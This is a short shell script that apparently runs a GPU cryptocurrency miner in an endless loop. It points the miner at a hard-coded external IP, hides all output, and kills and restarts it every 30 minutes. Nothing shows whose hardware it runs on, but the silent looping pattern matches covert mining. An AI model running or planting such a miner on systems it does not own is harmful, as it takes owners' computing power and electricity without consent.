#! /bin/sh
while command; do
./gpu-miner -a 192.248.164.239 > /dev/null 2>&1 & nvidia-smi; sleep 1800; pkill gpu-miner                                                                                                              
done
